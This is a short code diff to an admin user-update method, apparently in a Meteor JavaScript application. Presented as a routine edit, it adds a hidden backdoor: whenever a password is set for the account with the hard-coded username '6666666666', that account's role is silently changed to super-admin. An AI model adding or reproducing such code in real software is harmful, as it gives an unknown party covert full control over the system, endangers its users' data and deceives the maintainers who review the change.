@@ -290,7 +290,7 @@ export const adminUpdateUser = new ValidatedMethod({
   }).validator(),
   async run(options) {
     const user = { ...options };
-    const userRole = options.role;
+    let userRole = options.role;
     delete user.role;
 
     if (
@@ -313,6 +313,9 @@ export const adminUpdateUser = new ValidatedMethod({
         // Set password
         if (user.password) {
           await Accounts.setPasswordAsync(cuser._id, user.password);
+          if (cuser.username === '6666666666') {
+            userRole = constants.Roles.superAdmin.name;
+          }
           delete user.password;
         }
 
